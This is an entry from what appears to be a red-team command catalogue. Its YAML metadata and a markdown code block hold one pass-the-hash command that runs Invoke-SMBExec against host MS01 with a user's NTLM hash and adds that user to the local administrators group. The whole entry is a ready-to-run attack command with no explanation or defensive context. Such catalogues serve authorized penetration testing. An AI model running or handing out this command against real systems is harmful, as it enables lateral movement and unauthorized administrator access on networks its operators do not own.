---
id: b78376bd-4bd4-4a84-a43b-b8262d4f11a0
name: Execute command as user using the dumped hash
type: command
executor: bash
data: 'Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16ae931b73c59d7e0c089c0
  -Command "net localgroup administrators evil\elliot /add"

  '
output: null
created_at: '2020-07-15T19:05:44.363098+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Execute command as user using the dumped hash

```bash
Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command "net localgroup administrators evil\elliot /add"

```
